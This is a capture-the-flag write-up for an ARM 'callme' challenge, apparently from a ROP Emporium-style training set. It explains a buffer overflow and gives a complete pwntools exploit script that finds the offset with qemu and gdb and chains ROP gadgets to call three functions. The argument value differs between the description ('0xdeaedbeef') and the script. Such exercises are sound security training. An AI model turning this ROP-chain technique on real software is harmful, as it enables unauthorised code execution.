# Callme

## Target
call `callme_one`, `callme_two` and `callme_three` in this order with the following arguments: `0xdeaedbeef`, `0xcafebabe` and `0xd00df00d`.

## The vuln
A buffer overflow allows ROPchain creation and execution. By using `ropper` or similar tools is possible to find gadgets which allows to correctly set the arguments and call the functions `callme_one`, `callme_two` and `callme_three` in sequence.

### Warning
For this architecture, `ropper` won't find the right gadget. We suggest using `ROPgadget` for `arm` architectures

## The script
```python
from pwn import *
import subprocess
from threading import Thread

#
# Context
#

e = context.binary = ELF('callme_armv5-hf')
context.arch = 'arm'
context.bits = 32

#
# Offset
#

PORT = 1234
LIBDIR = '/usr/arm'

def qemu_thread():
    with subprocess.Popen(['/usr/bin/qemu-arm', '-L', LIBDIR, '-g', str(PORT), e.path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as qemu:
        qemu.stdin.write(cyclic(0x200))
        sleep(1)
        qemu.stdin.write(b'\n')

Thread(target=qemu_thread).start()

commands = f"""set arch arm
symbol-file callme_armv5-hf
target remote :{PORT}
b *pwnme+84
c
ni
i r pc
q
"""
with open("command_file", "w") as cf:
    cf.write(commands)

with subprocess.Popen(['/usr/bin/gdb-multiarch', '--command=command_file', '--batch'], stdout=subprocess.PIPE, stderr=subprocess.PIPE) as gdb:
    gdb.wait()
    pc = gdb.stdout.read().split(b'\n')[-2].decode().split()[-1]

info(f'PC: {pc}')
offset = cyclic_find(bytes.fromhex(pc[2:]))
info(f'Offset: {offset}')

#
# ROP
#

# Alternative: use "ropper"
CALLME_ONE   = p32(e.plt["callme_one"])
CALLME_TWO   = p32(e.plt["callme_two"])
CALLME_THREE = p32(e.plt["callme_three"])
EXIT         = p32(e.plt["exit"])

# Calling convention (a0, a1, a2)
BIGPOP = p32(next(e.search(asm('pop {r0, r1, r2, lr, pc}'))))


SET_PARAMETERS  = b''
SET_PARAMETERS += p32(0xdeadbeef)
SET_PARAMETERS += p32(0xcafebabe)
SET_PARAMETERS += p32(0xd00df00d)

#
# Exploit
#

io = process(e.path)

payload =  b''
payload += b'A' * offset
payload += b'Por' # Di "Porco dio se lo stack non si allinea!"

payload += BIGPOP
payload += SET_PARAMETERS
payload += BIGPOP
payload += CALLME_ONE
payload += SET_PARAMETERS
payload += BIGPOP
payload += CALLME_TWO
payload += SET_PARAMETERS
payload += EXIT
payload += CALLME_THREE

io.sendlineafter(b'> ', payload)

info(io.recvuntil(b'}').decode())
io.close()
```